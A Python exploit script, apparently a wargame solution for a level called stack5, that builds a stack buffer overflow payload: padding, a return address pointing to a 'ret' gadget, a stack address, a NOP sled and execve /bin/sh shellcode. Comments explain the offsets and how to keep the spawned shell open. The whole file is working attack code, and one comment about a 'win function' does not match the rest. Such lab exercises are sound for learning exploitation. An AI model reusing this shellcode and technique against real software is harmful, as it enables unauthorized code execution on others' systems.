import struct

## HOW TO USE ##
"""
Run the following command : 
(python stack5.py; cat) | $PATH_TO_BINARY

This is because for you to access shell there must be an input pipe to shell. That is provided by 'cat'. 
Without the 'cat' command, the OS closes the input pipe as soon as pyhton program exits.

"""
## END ##

# 4 bytes for the 'ret' variable
# compiler allocates extra 8 bytes for unknown reasons
# compiler pushes %ebp (4 bytes) register onto the stack at the start of any function
padding = "A" * 64 + "A" * 16

# fake return address
# first return to the address where 'ret' call exists and then the next address on stack will be to our shell code
# this is because program checks whether the return address is in the stack so we have to fool it by giving a valid return address within the function stack
# this can be found using gdb
fake_addr = struct.pack("I", 0x08048544)

# Addresss in stack where there is a NOP or shell_code
# Find this addresss using gdb
# Value that will be written to return address
ret_addr = struct.pack("I", 0xbffff7d0)

# padding with NOPs 
nops = "\x90" * 40

shell_code = ("\x31\xc0\x50\x68\x2f\x2f\x73"
				"\x68\x68\x2f\x62\x69\x6e\x89"
				"\xe3\x89\xc1\x89\xc2\xb0\x0b"
				"\xcd\x80\x31\xc0\x40\xcd\x80")

# there will be a segmentation fault after the code redirection
# this is because the return address is garbage value for win function call frame
print(padding + fake_addr + ret_addr + nops + shell_code)
